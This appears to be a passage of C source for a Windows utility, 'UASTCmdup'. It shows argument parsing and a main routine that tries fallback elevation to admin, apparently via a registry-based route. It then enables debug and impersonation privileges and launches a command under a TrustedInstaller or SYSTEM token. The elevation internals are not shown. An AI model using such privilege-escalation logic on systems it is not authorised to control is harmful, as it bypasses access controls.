// ============================================================================
// 命令行解析
// ============================================================================

/**
 * 解析命令行参数。
 * 所有选项支持 - / -- / 前缀, : / = 分隔符, 不区分大小写。
 * 内部参数 --notify 被特殊处理, 结果写入 g_notifyEventName。
 */
static ParsedCmdLine ParseCommandLine(int argc, wchar_t** argv)
{
    ParsedCmdLine p;
    BOOL inTarget = FALSE;
    int i;

    ZeroMemory(&p, sizeof(p));
    p.valid = TRUE;

    if (argc <= 1) return p;

    for (i = 1; i < argc; i++) {
        WCHAR arg[MAX_PATH * 2];
        WCHAR opt[MAX_PATH * 2];
        WCHAR optUpper[MAX_PATH * 2];
        WCHAR value[MAX_PATH];
        WCHAR valueUpper[MAX_PATH];
        const WCHAR* key = NULL;
        BOOL isOption = FALSE;

        wcsncpy_s(arg, _countof(arg), argv[i], _TRUNCATE);

        // 已进入目标命令行区: 后续参数原样拼接
        if (inTarget) {
            if (p.options.target[0])
                wcscat_s(p.options.target, _countof(p.options.target), L" ");
            wcscat_s(p.options.target, _countof(p.options.target), arg);
            continue;
        }

        // 判断是否为选项 (以 - 或 / 开头)
        if (arg[0] == L'-' || arg[0] == L'/') isOption = TRUE;

        if (!isOption) {
            inTarget = TRUE;
            wcsncpy_s(p.options.target, _countof(p.options.target), arg, _TRUNCATE);
            continue;
        }

        // 去掉前缀
        if (arg[0] == L'-' && arg[1] == L'-')
            wcsncpy_s(opt, _countof(opt), arg + 2, _TRUNCATE);
        else
            wcsncpy_s(opt, _countof(opt), arg + 1, _TRUNCATE);

        wcsncpy_s(optUpper, _countof(optUpper), opt, _TRUNCATE);
        ToUpperW(optUpper);

        // ---- 无值选项 ----
        if (wcscmp(optUpper, L"WAIT") == 0) { p.options.wait = TRUE; continue; }
        if (wcscmp(optUpper, L"VERSION") == 0) { p.showVersion = TRUE; continue; }
        if (wcscmp(optUpper, L"?") == 0 ||
            wcscmp(optUpper, L"H") == 0 ||
            wcscmp(optUpper, L"HELP") == 0) {
            p.showHelp = TRUE; continue;
        }

        // ---- 内部参数: --notify "<事件名>" ----
        // 由父进程写入注册表命令行, 新进程启动后据此通知父进程。
        // 值放在下一个 argv 中 (即 --notify "name" 的形式)。
        if (wcscmp(optUpper, L"NOTIFY") == 0) {
            if (i + 1 < argc) {
                wcsncpy_s(g_notifyEventName, _countof(g_notifyEventName),
                    argv[i + 1], _TRUNCATE);
                i++;   // 跳过值
            }
            continue;
        }

        // ---- 带值选项 ----
        if (StartsWithICase(opt, L"U") &&
            (wcslen(opt) == 1 || opt[1] == L':' || opt[1] == L'=')) {
            key = L"U";
            if (!ExtractValue(opt, L"U", value, _countof(value))) {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-U 缺少参数");
                return p;
            }
        }
        else if (StartsWithICase(opt, L"P") &&
            (wcslen(opt) == 1 || opt[1] == L':' || opt[1] == L'=')) {
            key = L"P";
            if (!ExtractValue(opt, L"P", value, _countof(value))) {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-P 缺少参数");
                return p;
            }
        }
        else if (StartsWithICase(opt, L"M") &&
            (wcslen(opt) == 1 || opt[1] == L':' || opt[1] == L'=')) {
            key = L"M";
            if (!ExtractValue(opt, L"M", value, _countof(value))) {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-M 缺少参数");
                return p;
            }
        }
        else if (StartsWithICase(opt, L"Priority")) {
            key = L"Priority";
            if (!ExtractValue(opt, L"Priority", value, _countof(value))) {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-Priority 缺少参数");
                return p;
            }
        }
        else if (StartsWithICase(opt, L"ShowWindowMode")) {
            key = L"ShowWindowMode";
            if (!ExtractValue(opt, L"ShowWindowMode", value, _countof(value))) {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-ShowWindowMode 缺少参数");
                return p;
            }
        }
        else if (StartsWithICase(opt, L"CurrentDirectory")) {
            key = L"CurrentDirectory";
            if (!ExtractValue(opt, L"CurrentDirectory", value, _countof(value))) {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-CurrentDirectory 缺少参数");
                return p;
            }
        }
        else {
            p.valid = FALSE;
            swprintf_s(p.errorMsg, _countof(p.errorMsg), L"未知选项: %s", arg);
            return p;
        }

        wcsncpy_s(valueUpper, _countof(valueUpper), value, _TRUNCATE);
        ToUpperW(valueUpper);

        // 按 key 分派具体值
        if (wcscmp(key, L"U") == 0) {
            if (wcscmp(valueUpper, L"T") == 0)      p.options.userMode = 2;
            else if (wcscmp(valueUpper, L"S") == 0) p.options.userMode = 1;
            else if (wcscmp(valueUpper, L"C") == 0) p.options.userMode = 3;
            else if (wcscmp(valueUpper, L"E") == 0) p.options.userMode = 0;
            else if (wcscmp(valueUpper, L"P") == 0) p.options.userMode = 0;
            else {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-U 取值无效: %s", value);
                return p;
            }
        }
        else if (wcscmp(key, L"P") == 0) {
            if (wcscmp(valueUpper, L"E") == 0)      p.options.privMode = 1;
            else if (wcscmp(valueUpper, L"D") == 0) p.options.privMode = 2;
            else {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-P 取值无效: %s", value);
                return p;
            }
        }
        else if (wcscmp(key, L"M") == 0) {
            if (wcscmp(valueUpper, L"S") == 0)      p.options.integMode = 1;
            else if (wcscmp(valueUpper, L"H") == 0) p.options.integMode = 2;
            else if (wcscmp(valueUpper, L"M") == 0) p.options.integMode = 3;
            else if (wcscmp(valueUpper, L"L") == 0) p.options.integMode = 4;
            else {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-M 取值无效: %s", value);
                return p;
            }
        }
        else if (wcscmp(key, L"Priority") == 0) {
            if (wcscmp(valueUpper, L"IDLE") == 0)             p.options.priorityMode = 6;
            else if (wcscmp(valueUpper, L"BELOWNORMAL") == 0) p.options.priorityMode = 5;
            else if (wcscmp(valueUpper, L"NORMAL") == 0)      p.options.priorityMode = 4;
            else if (wcscmp(valueUpper, L"ABOVENORMAL") == 0) p.options.priorityMode = 3;
            else if (wcscmp(valueUpper, L"HIGH") == 0)        p.options.priorityMode = 2;
            else if (wcscmp(valueUpper, L"REALTIME") == 0)    p.options.priorityMode = 1;
            else {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-Priority 取值无效: %s", value);
                return p;
            }
        }
        else if (wcscmp(key, L"ShowWindowMode") == 0) {
            if (wcscmp(valueUpper, L"SHOW") == 0)          p.options.windowMode = 0;
            else if (wcscmp(valueUpper, L"HIDE") == 0)     p.options.windowMode = 1;
            else if (wcscmp(valueUpper, L"MAXIMIZE") == 0) p.options.windowMode = 2;
            else if (wcscmp(valueUpper, L"MINIMIZE") == 0) p.options.windowMode = 3;
            else {
                p.valid = FALSE;
                swprintf_s(p.errorMsg, _countof(p.errorMsg), L"-ShowWindowMode 取值无效: %s", value);
                return p;
            }
        }
        else if (wcscmp(key, L"CurrentDirectory") == 0) {
            wcsncpy_s(p.options.currentDirectory, MAX_PATH, value, _TRUNCATE);
        }
    }

    return p;
}

// ============================================================================
// 主流程
// ============================================================================

static int RunMain(int argc, wchar_t** argv)
{
    ParsedCmdLine parsed;
    WCHAR selfPath[MAX_PATH] = { 0 };
    WCHAR originalArgs[MAX_PATH * 4] = { 0 };
    WCHAR errBuf[512] = { 0 };
    HANDLE hToken = NULL;
    BOOL ok;
    int i;

    InitConsole();

    // 先解析命令行 (其中可能包含父进程传的 --notify)
    ZeroMemory(&parsed, sizeof(parsed));
    parsed.valid = TRUE;
    if (argc > 1) {
        parsed = ParseCommandLine(argc, argv);
    }

    // ★ 立即通知父进程本进程已成功启动 (若 --notify 存在)
    NotifyParentIfNeeded();

    // 打印启动横幅
    Log(L"==========================================\n");
    Log(L"  UASTCmdup %s\n", APP_VERSION);
    Log(L"==========================================\n\n");

    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    Log(L"[*] 自身路径: %s\n", selfPath);

    if (parsed.showVersion) {
        Log(L"UASTCmdup %s\n", APP_VERSION);
        return 0;
    }
    if (parsed.showHelp) {
        Log(L"%s\n", HELP_TEXT);
        return 0;
    }
    if (!parsed.valid) {
        Log(L"[!] 参数错误: %s\n", parsed.errorMsg);
        return 1;
    }
    if (!parsed.options.target[0]) {
        Log(L"[!] 未指定目标命令行\n");
        Log(L"[*] 使用 -Help 查看用法\n");
        return 1;
    }

    // ---- 检查管理员权限 ----
    if (!IsCurrentProcessAdmin()) {
        Log(L"[*] 当前是普通用户, 尝试提权至管理员...\n");

        for (i = 1; i < argc; i++) {
            if (i > 1) wcscat_s(originalArgs, _countof(originalArgs), L" ");
            wcscat_s(originalArgs, _countof(originalArgs), argv[i]);
        }

        if (TryElevateWithFallback(originalArgs, selfPath)) {
            Log(L"\n[+] 已触发提权, 请在新进程中查看结果\n");
            return 0;
        }

        Log(L"\n[!] 所有提权方式均失败\n");
        return 1;
    }

    // ---- 已是管理员 ----
    Log(L"[+] 当前已是管理员\n");

    EnablePrivilege(SE_DEBUG_NAME);
    EnablePrivilege(SE_IMPERSONATE_NAME);
    EnablePrivilege(SE_INC_BASE_PRIORITY_NAME);

    Log(L"[*] 获取目标令牌 (模式 %d)...\n", parsed.options.userMode);
    hToken = GetTargetToken(parsed.options.userMode, errBuf, _countof(errBuf));
    if (!hToken) {
        Log(L"[!] %s\n", errBuf);
        return 1;
    }
    Log(L"[+] 已获得目标令牌\n");

    AdjustTokenForOptions(hToken, &parsed.options);

    Log(L"[*] 创建子进程...\n");
    ok = ExecuteWithToken(hToken, &parsed.options, errBuf, _countof(errBuf));
    CloseHandle(hToken);

    if (!ok) {
        Log(L"[!] %s\n", errBuf);
        return 1;
    }

    Log(L"[+] 完成\n");
    return 0;
}

// ============================================================================
// 入口
// ============================================================================

int wmain(int argc, wchar_t** argv)
{
    int ret = RunMain(argc, argv);
    PauseOnError(ret);
    return ret;
}